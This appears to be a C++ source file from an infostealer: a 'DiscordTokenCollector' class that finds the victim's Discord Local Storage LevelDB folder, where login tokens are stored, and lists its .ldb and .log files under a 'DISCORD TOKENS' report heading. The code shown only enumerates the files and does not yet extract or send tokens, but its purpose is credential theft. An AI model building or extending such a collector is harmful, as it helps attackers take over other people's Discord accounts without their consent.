#include "discord_token_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <fstream>

std::string DiscordTokenCollector::CollectDiscordTokens() {
    std::ostringstream result;
    result << "\n=== DISCORD TOKENS ===\n";
    
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    
    std::string discordPath = std::string(appdata) + "\\discord";
    std::string discordLocalStorage = discordPath + "\\Local Storage\\leveldb";
    
    if (std::filesystem::exists(discordLocalStorage)) {
        result << "Discord Local Storage: FOUND\n";
        
        try {
            for (auto& p : std::filesystem::directory_iterator(discordLocalStorage)) {
                if (p.is_regular_file()) {
                    std::string ext = p.path().extension().string();
                    if (ext == ".ldb" || ext == ".log") {
                        result << "  File: " << p.path().filename().string() << "\n";
                    }
                }
            }
        } catch (...) {
            result << "  Access denied\n";
        }
    } else {
        result << "Discord not found\n";
    }
    
    return result.str();
}
